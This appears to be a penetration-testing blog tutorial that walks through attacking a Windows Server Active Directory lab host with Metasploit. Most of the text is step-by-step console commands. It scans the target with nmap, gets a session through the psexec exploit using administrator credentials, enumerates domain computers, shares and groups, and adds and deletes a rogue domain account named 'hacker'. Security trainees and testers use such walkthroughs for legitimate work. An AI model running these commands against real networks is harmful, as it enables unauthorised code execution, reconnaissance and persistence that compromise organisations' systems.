<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Penetration Testing in Windows Server Active Directory using  Metasploit (Part 1)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-windows-server-active-directory-using-metasploit-part-1/" rel="bookmark"><time class="entry-date published" datetime="2016-07-23T12:47:04+00:00">July 23, 2016</time><time class="updated" datetime="2025-05-12T21:19:40+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">Open Kali terminal type <strong>nmap -sV 192.168.0.104</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">you’ll see that port 445 is open, port 445 is a traditional Microsoft networking port. Specifically, TCP port 445 runs Server Message Block(SMB) over TCP/IP. This is a core means for communication on a Microsoft-based LAN</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-yNgZvcjzOag/V5Nk6iMp-TI/AAAAAAAAM6Y/alDKbfxDt3MXjgKQFbWBHJFdy1wsTwxuwCLcB/s1600/0.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">In Kali terminal type msfconsole</span></p>
<p style="text-align: justify;"><span style="color: #000000;">This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the “<strong>psexec</strong>” utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>&gt; <strong>use exploit/windows/smb/psexec</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> exploit(<span style="color: #800000;"><strong>psexec</strong>)</span> &gt; <strong>set rhost 192.168.0.104</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> exploit(<span style="color: #800000;"><strong>psexec</strong></span>) &gt; <strong>set rport 445</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> exploit(<span style="color: #800000;"><strong>psexec</strong></span>) &gt; <strong>set smbuser administrator</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> exploit(<span style="color: #800000;"><strong>psexec</strong></span>) &gt; <strong>set smbpass Ignite@123</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> exploit(<span style="color: #800000;"><strong>psexec</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-fBUlR0NSKRw/V5Nk9dbPedI/AAAAAAAAM6c/Qv6kd3kQLwEmHirjXScD92IQTyqx5JtEACLcB/s1600/1.png"/></p>
<h4 style="text-align: justify;"><span style="color: #000000;"><strong>Find All Active Directory users</strong></span></h4>
<p style="text-align: justify;"><span style="color: #000000;">This module will <strong>enumerate computers</strong> included in the primary Domain</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>&gt; <strong>use post/windows/gather/enum_ad_computers</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>post(<span style="color: #800000;"><strong>enum_ad_computers</strong></span>) &gt; <strong>set filter objectCategory=computer</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>post(<span style="color: #800000;"><strong>enum_ad_computers</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>enum_ad_computers</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-hXTouaDYPuE/V5NlFj5nk_I/AAAAAAAAM6k/UB7yYiryIOY_8ewFOGLl_sEsk4BFQcKbACLcB/s1600/2.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Find All Share Folder in Active Directory</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">This module will enumerate configured and recently used file shares.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>&gt; <strong>post/windows/gather/enum_shares</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>post(<span style="color: #800000;"><strong>enum_shares</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>enum_shares</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-slo1vsEDBxM/V5Nk_83B3zI/AAAAAAAAM6g/P1MsEPfu4qUo0EAkJsruCdj7qAuS11r7wCLcB/s1600/3.png"/></p>
<p><span style="color: #000000;"><strong>Gather All Groups in Active Directory</strong></span></p>
<p><span style="color: #000000;">This module will enumerate Active Directory groups on the specified domain.</span></p>
<p><span style="color: #000000;">msf &gt; <strong>use post/windows/gather/enum_ad_groups</strong></span></p>
<p><span style="color: #000000;">msf post(<span style="color: #800000;"><strong>enum_ad_groups</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p><span style="color: #000000;">msf post(<strong><span style="color: #800000;">enum_ad_groups</span>)</strong> &gt; <strong>exploit</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-OymBCz7IR_U/V5NlMyIgRCI/AAAAAAAAM64/RbatDCrTLuI0wJghKfjByWLR_ixgPLruACLcB/s1600/4.png"/></p>
<p><span style="color: #000000;"><strong>To  Add Any User in Active Directory</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">This module adds a user to the Domain and/or to a Domain group. It will check if sufficient privileges are present for certain actions and run getprivs for system. If you elevated privs to system,the Se Assign Primary Token Privilege will not be assigned. You need to migrate to a process that is running as system. If you don’t have privs, this script exits.</span></p>
<p><span style="color: #000000;"><strong> </strong><strong>msf </strong>&gt; <strong>use post/windows/manage/add_user_domain</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong>post(<span style="color: #800000;"><strong>add_user_domain</strong></span>) &gt; <strong>set addtodomain true</strong></span></p>
<p><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>add_user_domain</strong></span>) &gt; <strong>set username hacker</strong></span></p>
<p><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>add_user_domain</strong></span>) &gt; <strong>set password abcd@123</strong></span></p>
<p><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>add_user_domain</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>add_user_domain</strong></span>) &gt; <strong>exploit</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-tvlvZc14oIs/V5NlH0FtnaI/AAAAAAAAM6o/OaneEUsnCjUSyck-V0lcKSm9H149EyNVACLcB/s1600/6.png"/></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-0QAdebDHfAA/V5NlIGXpUQI/AAAAAAAAM6s/KoMGCJzf8Ook-FrXaEXeixKbgLVt53-IQCLcB/s1600/7.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>To  Delete Any  User from Active Directory</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong> </strong>This module deletes a local user account from the specified server, or the local machine if no server is given.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf &gt; <strong>use post/windows/manage/delete_user</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf post(<span style="color: #800000;"><strong>delete_user</strong></span>) &gt; <strong>set username hacker</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf post(<span style="color: #800000;"><strong>delete_user</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">msf post(<span style="color: #800000;"><strong>delete_user</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-7GrDmxIO8Tw/V5NlLVs6bFI/AAAAAAAAM60/-5OnZlYy-q0pHXDLGYzfHZpAxKA1M-DjQCLcB/s1600/8.png"/></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-qDp7KCkpJGY/V5NlJwSto3I/AAAAAAAAM6w/QJqUdXYOnLMFFCuT1J3iq2_OYZycxjIsgCLcB/s1600/9.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Author</strong>: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets <a href="https://www.linkedin.com/in/aarti--singh/"><span style="color: #0000ff;"><strong>Here</strong></span></a>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
